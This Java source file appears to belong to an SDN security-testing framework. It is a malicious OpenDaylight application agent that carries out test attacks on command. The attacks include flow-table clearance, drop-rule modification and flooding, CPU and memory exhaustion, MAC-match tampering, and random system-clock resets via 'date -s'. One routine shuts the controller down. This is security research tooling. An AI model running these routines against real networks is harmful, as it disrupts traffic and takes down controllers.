package org.deltaproject.odlagent;

import org.opendaylight.controller.sal.action.Action;
import org.opendaylight.controller.sal.action.Drop;
import org.opendaylight.controller.sal.core.Node;
import org.opendaylight.controller.sal.core.NodeConnector;
import org.opendaylight.controller.sal.core.Property;
import org.opendaylight.controller.sal.core.UpdateType;
import org.opendaylight.controller.sal.flowprogrammer.Flow;
import org.opendaylight.controller.sal.flowprogrammer.IFlowProgrammerService;
import org.opendaylight.controller.sal.match.Match;
import org.opendaylight.controller.sal.match.MatchField;
import org.opendaylight.controller.sal.match.MatchType;
import org.opendaylight.controller.sal.packet.IDataPacketService;
import org.opendaylight.controller.sal.packet.IListenDataPacket;
import org.opendaylight.controller.sal.packet.PacketResult;
import org.opendaylight.controller.sal.packet.RawPacket;
import org.opendaylight.controller.sal.reader.FlowOnNode;
import org.opendaylight.controller.sal.routing.IListenRoutingUpdates;
import org.opendaylight.controller.sal.routing.IRouting;
import org.opendaylight.controller.sal.utils.EtherTypes;
import org.opendaylight.controller.sal.utils.ServiceHelper;
import org.opendaylight.controller.forwardingrulesmanager.IForwardingRulesManager;
import org.opendaylight.controller.hosttracker.IfIptoHost;
import org.opendaylight.controller.hosttracker.IfNewHostNotify;
import org.opendaylight.controller.hosttracker.hostAware.HostNodeConnector;
import org.opendaylight.controller.hosttracker.hostAware.IHostFinder;
import org.opendaylight.controller.sal.utils.Status;
import org.opendaylight.controller.statisticsmanager.IStatisticsManager;
import org.opendaylight.controller.switchmanager.IInventoryListener;
import org.opendaylight.controller.switchmanager.ISwitchManager;
import org.opendaylight.controller.topologymanager.ITopologyManager;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.*;

//import org.opendaylight.controller.containermanager.*;

class CPU extends Thread {
    int result = 1;

    @Override
    public void run() {
        // TODO Auto-generated method stub
        while (true) {
            result = result ^ 2;
        }
    }
}

class SystemTimeSet extends Thread {
    protected Runtime rt;
    protected String date_information[];
    protected int day;
    protected final String month[] = {"Jan", "Feb", "Mar", "Apr", "May",
            "Jun", "Jul", "Aug", "Dep", " Oct", "Nov", "Dec"};
    protected int year;
    protected Random rand;

    public SystemTimeSet() {
        rt = Runtime.getRuntime();
        date_information = new String[3];
        rand = new Random();

    }

    @Override
    public void run() {
        while (true) {
            day = rand.nextInt(29) + 1;
            year = rand.nextInt(100) + 1970;
            date_information[0] = String.valueOf(day);
            date_information[1] = month[rand.nextInt(11)];
            date_information[2] = String.valueOf(year);

            try {
                Process proc = rt.exec(new String[]{
                        "date",
                        "-s",
                        date_information[0] + " " + date_information[1] + " "
                                + date_information[2]});
                BufferedReader br = new BufferedReader(new InputStreamReader(
                        proc.getInputStream()));
                Thread.sleep(500);
            } catch (IOException e) {
                // TODO Auto-generated catch block
                System.out.println("System set error");
                e.printStackTrace();
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }
}

/*
 * Simple bundle to grab some statistics Fred Hsu
 */
@SuppressWarnings("deprecation")
public class AppAgent implements IListenDataPacket, IHostFinder,
        IfNewHostNotify, IListenRoutingUpdates, IInventoryListener {
    private static final Logger log = LoggerFactory.getLogger(AppAgent.class);
    private String containerName = "default";

    private ISwitchManager switchManager = null;
    private IFlowProgrammerService programmer = null;
    private IDataPacketService dataPacketService = null;

    private IfIptoHost hostTracker;
    private IForwardingRulesManager frm;
    private ITopologyManager topologyManager;
    private IRouting routing;

    private IStatisticsManager statsManager = (IStatisticsManager) ServiceHelper
            .getInstance(IStatisticsManager.class, containerName, this);

    Vector<Flow> flows = new Vector<Flow>();

    private Interface cm;
    private SystemTimeSet systime;
    private Random ran;

    private boolean isLoop = false;
    private boolean isDrop = false;

    private String droppedPkt = "nothing";

    public AppAgent() {
        ran = new Random();
    }

    void init() {
        connectManager();
    }

    void destroy() {

    }

    void stop() {

    }

    public void setRouting(IRouting routing) {
        log.debug("Setting routing");
        this.routing = routing;
    }

    public void unsetRouting(IRouting routing) {
        if (this.routing == routing) {
            this.routing = null;
        }
    }

    public void setTopologyManager(ITopologyManager topologyManager) {
        log.debug("Setting topologyManager");
        this.topologyManager = topologyManager;
    }

    public void unsetTopologyManager(ITopologyManager topologyManager) {
        if (this.topologyManager == topologyManager) {
            this.topologyManager = null;
        }
    }

    public void setHostTracker(IfIptoHost hostTracker) {
        log.debug("Setting HostTracker");
        this.hostTracker = hostTracker;
    }

    public void setForwardingRulesManager(
            IForwardingRulesManager forwardingRulesManager) {
        log.debug("Setting ForwardingRulesManager");
        this.frm = forwardingRulesManager;
    }

    public void unsetHostTracker(IfIptoHost hostTracker) {
        if (this.hostTracker == hostTracker) {
            this.hostTracker = null;
        }
    }

    public void unsetForwardingRulesManager(
            IForwardingRulesManager forwardingRulesManager) {
        if (this.frm == forwardingRulesManager) {
            this.frm = null;
        }
    }

    void setDataPacketService(IDataPacketService s) {
        this.dataPacketService = s;
    }

    void unsetDataPacketService(IDataPacketService s) {
        if (this.dataPacketService == s) {
            this.dataPacketService = null;
        }
    }

    public void setFlowProgrammerService(IFlowProgrammerService s) {
        this.programmer = s;
    }

    public void unsetFlowProgrammerService(IFlowProgrammerService s) {
        if (this.programmer == s) {
            this.programmer = null;
        }
    }

    void setSwitchManager(ISwitchManager s) {
        this.switchManager = s;
    }

    void unsetSwitchManager(ISwitchManager s) {
        if (this.switchManager == s) {
            this.switchManager = null;
        }
    }

    public void connectManager() {
        cm = new Interface();
        cm.setAgent(this);
        cm.setServerAddr();
        cm.connectServer("AppAgent");
        cm.start();
    }

    public void setControlMessageDrop() {
        this.isDrop = true;
    }

    public void setInfiniteLoop() {
        this.isLoop = true;
    }

    public void testInfiniteLoop() {
        int i = 0;
        System.out.println("[AppAgent] Infinite Loop");

        while (true) {
            i++;

            if (i == 10)
                i = 0;
        }
    }

    public String testInternalStorageAbuse() {
        System.out.println("[AppAgent] Internal_Storage_Abuse");

        String removed = "";

        Set<Node> node_array = switchManager.getNodes();
        Set<HostNodeConnector> host_array = hostTracker.getAllHosts();

        for (Node node : node_array) {
            switchManager.removeNodeAllProps(node);
            removed += node.toString() + ",";
        }

        return removed;
    }

    public String testFlowRuleModification() {
        System.out.println("[AppAgent] Flow_Rule_Modification");

        String modified = "";

        try {
            while (!modified.contains("success")) {
                for (Node node : switchManager.getNodes()) {
                    for (FlowOnNode flow : statsManager.getFlows(node)) {
                        List<Action> actions = new ArrayList<Action>();
                        actions.add(new Drop());
                        Flow newflow = new Flow(flow.getFlow().getMatch(),
                                actions);
                        Status status = programmer.modifyFlow(node,
                                flow.getFlow(), newflow);
                        modified = "success|" + flow.getFlow().toString()
                                + "\n --> " + newflow.toString();
                        System.out.println(modified);
                    }
                }
            }
        } catch (Exception e) {
            System.out.println(e);
            return modified;
        }

        return modified;
    }

    public boolean testFlowTableClearance(boolean isLoop) {
        System.out.println("[AppAgent] Flow_Table_Cleareance");

        int cnt = 1;

        for (int i = 0; i < cnt; i++) {
            try {
                for (Node node : switchManager.getNodes()) {
                    for (FlowOnNode flow : statsManager.getFlows(node)) {
                        Status status = programmer.removeFlow(node,
                                flow.getFlow());
                        System.out.println(flow.toString());
                        /* This function doen't work properly, so we changed */
                        // Status status = programmer.removeAllFlows(node);

                        if (!status.isSuccess())
                            return false;
                    }
                }
            } catch (Exception e) {
                System.out.println(e);
            }

            if (isLoop)
                i = -1;
        }

        return true;
    }

    public void testResourceExhaustionMem() {
        System.out.println("[AppAgent] Resource Exhausion : Mem");
        ArrayList<long[][]> arry;
        // ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
        arry = new ArrayList<long[][]>();
        while (true) {
            arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
        }
    }

    public void testResourceExhaustionCPU() {
        System.out.println("[AppAgent] Resource Exhausion : CPU");
        int thread_count = 0;

        for (int count = 0; count < 1000; count++) {
            CPU cpu_thread = new CPU();
            cpu_thread.start();
            thread_count++;

            System.out.println("[AppAgent] Resource Exhausion : Thread "
                    + thread_count);
        }
    }

    public boolean testSystemVariableManipulation() {
        this.systime = new SystemTimeSet();
        systime.start();
        return true;
    }

    public void testSystemCommandExecution() {
        System.out
                .println("[AppAgent] System Command Execution : EXIT Controller");
        System.exit(0);
    }

    public boolean testFlowRuleFlooding() {
        System.out.println("[AppAgent] Flow_Rule_Flooding");
        short priority = 1;

        while (priority <= 32765) {
            for (Node node : switchManager.getNodes()) {
                Set<NodeConnector> set = switchManager.getNodeConnectors(node);

                for (NodeConnector nodecon : set) {
                    InetAddress addr = null;
                    Match match = new Match();

                    try {
                        String temp = "" + (ran.nextInt(252) + 1) + "."
                                + (ran.nextInt(252) + 1) + "."
                                + (ran.nextInt(252) + 1) + "."
                                + (ran.nextInt(252) + 1);

                        addr = InetAddress.getByName(temp);
                    } catch (UnknownHostException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }

                    List<Action> actions = new ArrayList<Action>();
                    actions.add(new Drop());

                    // Create matches
                    match.setField(MatchType.DL_TYPE,
                            EtherTypes.IPv4.shortValue());
                    match.setField(MatchType.NW_DST, addr);
                    match.setField(MatchType.IN_PORT, nodecon);

                    Flow flow = new Flow(match, actions);
                    flow.setIdleTimeout((short) 0);
                    flow.setHardTimeout((short) 0);
                    flow.setPriority(priority);
                    programmer.addFlow(node, flow);
                    priority++;
                }
            }
        }

        return true;
    }

    public String testSwitchFirmwareMisuse() {
        String result = "";
        System.out.println("[AppAgent] Switch_Firmware_Abuse");

        Set<HostNodeConnector> hosts = this.hostTracker.getAllHosts();

        Match modifiedMatch = new Match();
        modifiedMatch.setField(MatchType.DL_TYPE, EtherTypes.IPv4.shortValue());

        try {
            for (Node node : switchManager.getNodes()) {
                for (FlowOnNode flow : statsManager.getFlows(node)) {
                    Flow oldflow = flow.getFlow();
                    MatchField oldfield = oldflow.getMatch().getField(
                            MatchType.NW_DST);
                    InetAddress ipaddr = (InetAddress) oldfield.getValue();
                    byte[] newMacAddr = null;

                    for (HostNodeConnector hc : hosts) {
                        String addr = ipaddr.toString().substring(1);
                        System.out.println(addr + ":"
                                + hc.getNetworkAddressAsString());
                        if (addr.equals(hc.getNetworkAddressAsString())) {
                            newMacAddr = hc.getDataLayerAddressBytes();
                            modifiedMatch
                                    .setField(MatchType.DL_DST, newMacAddr);
                            Flow newflow = new Flow(modifiedMatch,
                                    oldflow.getActions());

                            Status status = programmer.modifyFlow(node,
                                    oldflow, newflow);

                            result = oldflow.toString() + "->"
                                    + newflow.toString();

                            if (status.isSuccess()) {
                                System.out.println("Rule Modify Success");
                            } else
                                return result;
                        }
                    }

                }
            }
        } catch (Exception e) {
            System.out.println(e);
        }

        return result;
    }

    public String sendUnFlaggedRemoveMsg() {
        for (Node node : switchManager.getNodes()) {
            Set<NodeConnector> set = switchManager.getNodeConnectors(node);

            for (NodeConnector nodecon : set) {
                InetAddress addr = null;
                Match match = new Match();

                try {
                    String temp = "" + (ran.nextInt(252) + 1) + "."
                            + (ran.nextInt(252) + 1) + "."
                            + (ran.nextInt(252) + 1) + "."
                            + (ran.nextInt(252) + 1);

                    addr = InetAddress.getByName(temp);
                } catch (UnknownHostException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }

                List<Action> actions = new ArrayList<Action>();
                actions.add(new Drop());

                // Create matches
                match.setField(MatchType.DL_TYPE,
                        EtherTypes.IPv4.shortValue());
                match.setField(MatchType.NW_DST, addr);
                match.setField(MatchType.IN_PORT, nodecon);

                Flow flow = new Flow(match, actions);
                flow.setIdleTimeout((short) 0);
                flow.setHardTimeout((short) 0);
                flow.setPriority((short) 555);
                programmer.addFlow(node, flow);
            }
        }
        return flows.toString();
    }

    public void nodeconnector_AppAgent() {
        System.out.println("[AppAgent] nodeconnector_AppAgent");
        for (Node node : switchManager.getNodes()) {
            Set<NodeConnector> set = switchManager.getNodeConnectors(node);
            for (NodeConnector nodecon : set) {
                System.out.println(nodecon.getNodeConnectorIdAsString() + ":"
                        + nodecon.getNodeConnectorIDString());
                switchManager.removeNodeConnectorAllProps(nodecon);
            }
        }

        for (Node node : switchManager.getNodes()) {
            System.out.println("After AppAgent");
            System.out.println(node.getNodeIDString() + ":" + node.getType());
        }
    }

    public String getDroppedPkt() {
        return droppedPkt;
    }

    public PacketResult receiveDataPacket(RawPacket inPkt) {
        // System.out.print(inPkt.toString());

        if (isLoop)
            this.testInfiniteLoop();

        if (isDrop) {
            // System.out.print(inPkt.toString());
            droppedPkt = inPkt.toString();
            return PacketResult.CONSUME;
        }

        return PacketResult.KEEP_PROCESSING;
    }

    public void notifyHTClient(HostNodeConnector hostNodeConnector) {

    }

    public void notifyHTClientHostRemoved(HostNodeConnector hostNodeConnector) {

    }

    public void find(InetAddress inetAddress) {

    }

    public void probe(HostNodeConnector hostNodeConnector) {

    }

    public void recalculateDone() {

    }

    public void notifyNode(Node node, UpdateType updateType, Map<String, Property> map) {

    }

    public void notifyNodeConnector(NodeConnector nodeConnector, UpdateType updateType, Map<String, Property> map) {

    }
}
